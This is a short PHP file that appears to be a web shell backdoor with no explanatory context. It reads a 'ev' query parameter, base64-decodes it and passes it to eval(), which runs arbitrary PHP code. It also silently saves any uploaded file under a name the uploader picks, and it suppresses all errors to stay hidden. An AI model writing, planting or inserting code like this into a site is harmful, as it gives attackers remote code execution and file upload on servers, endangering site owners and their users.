<?php
error_reporting(0);
$ev = $_GET["ev"];

if (isset($ev) && !empty($ev))
  {
  eval(base64_decode($ev));
  exit;
  }
  
(@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])); ?>
